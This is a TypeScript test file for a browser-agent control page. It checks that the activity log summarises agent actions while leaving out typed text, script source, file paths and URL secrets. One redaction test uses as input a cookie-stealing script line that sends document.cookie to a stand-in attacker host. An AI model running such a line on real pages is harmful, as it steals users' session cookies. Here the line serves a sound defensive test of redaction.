// The control page shows what agents did. It must be useful at a glance and must never show
// what the agent typed, the code it ran, or secrets in URLs.
import { describe, expect, it } from "vitest";
import { ActivityLog, controlCookieValue, describeCall, readCookie } from "../../src/control";

describe("describeCall", () => {
  it.each([
    ["tabs.open", { url: "https://mail.example.com/inbox?auth=SECRET#msg" }, "opened https://mail.example.com/inbox"],
    ["tabs.navigate", { action: "goto", url: "http://localhost:3000/?session=abc" }, "went to http://localhost:3000"],
    ["tabs.navigate", { action: "back" }, "went back"],
    ["page.click", { ref: "e12" }, "clicked e12"],
    ["page.type", { ref: "e3", text: "hunter2", submit: true }, "typed 7 characters and pressed Enter"],
    ["page.press", { keys: ["Control+a", "Backspace"] }, "pressed Control+a Backspace"],
    ["page.upload", { files: ["/home/me/cv.pdf", "/home/me/photo.jpg"] }, "uploaded 2 file(s)"],
    ["page.eval", { expression: "document.cookie" }, "ran a script on the page"],
    ["session.release", {}, "finished and handed the tabs back"],
  ])("%s %o -> %s", (method, params, expected) => expect(describeCall(method, params)).toBe(expected));

  it("never repeats typed text, script source or file paths", () => {
    const lines = [
      describeCall("page.type", { text: "my password is hunter2" }),
      describeCall("page.eval", { expression: "fetch('https://evil.example/?c=' + document.cookie)" }),
      describeCall("page.upload", { files: ["C:/Users/me/secret.txt"] }),
    ].join("\n");
    expect(lines).not.toMatch(/hunter2|evil\.example|cookie|secret\.txt/);
  });

  it("leaves out reads that would only add noise", () => {
    expect(describeCall("status")).toBeUndefined();
    expect(describeCall("tabs.list", { scope: "session" })).toBeUndefined();
    expect(describeCall("daemon.status")).toBeUndefined();
  });
});

describe("ActivityLog", () => {
  const thread = (id: string, title = id) => ({ id, title });

  it("lists threads by their latest action, newest action first", () => {
    const log = new ActivityLog();
    log.record(thread("a", "Book dentist"), "tabs.open", { url: "https://dentist.example" }, true, 900, 1_000);
    log.record(thread("b", "Expenses"), "page.click", { ref: "e1" }, false, 30_000, 2_000);
    log.record(thread("a", "Book dentist"), "page.click", { ref: "e7" }, true, 120, 3_000);
    const [first, second] = log.threadsByRecency();
    expect(first.info.title).toBe("Book dentist");
    expect(first.entries.map((e) => e.text)).toEqual(["clicked e7", "opened https://dentist.example"]);
    expect(second.entries).toEqual([{ at: 2_000, text: "clicked e1", ok: false, ms: 30_000 }]);
  });

  it("keeps a thread's real title when agent-browser calls arrive with only its id", () => {
    const log = new ActivityLog();
    log.record(thread("t1", "Book dentist"), "tabs.open", { url: "https://x.example" }, true, 1);
    log.record(thread("t1"), "cdp.send", { method: "Input.dispatchMouseEvent" }, true, 1);
    expect(log.threadsByRecency()[0].info.title).toBe("Book dentist");
  });

  it("keeps the most recent 40 actions per thread", () => {
    const log = new ActivityLog();
    for (let i = 0; i < 45; i++) log.record(thread("a"), "page.click", { ref: `e${i}` }, true, 1, i);
    const [t] = log.threadsByRecency();
    expect(t.entries).toHaveLength(40);
    expect(t.entries[0].text).toBe("clicked e44");
    expect(t.entries[39].text).toBe("clicked e5");
  });
});

describe("control cookie", () => {
  it("is derived from the token, not the token itself", () => {
    const token = "f".repeat(64);
    expect(controlCookieValue(token)).toMatch(/^[0-9a-f]{64}$/);
    expect(controlCookieValue(token)).not.toContain(token);
    expect(controlCookieValue(token)).not.toBe(controlCookieValue("e".repeat(64)));
  });

  it("is read from a Cookie header among others", () => {
    expect(readCookie("theme=dark; t3b_control=abc=; other=1", "t3b_control")).toBe("abc=");
    expect(readCookie(undefined, "t3b_control")).toBeUndefined();
  });
});
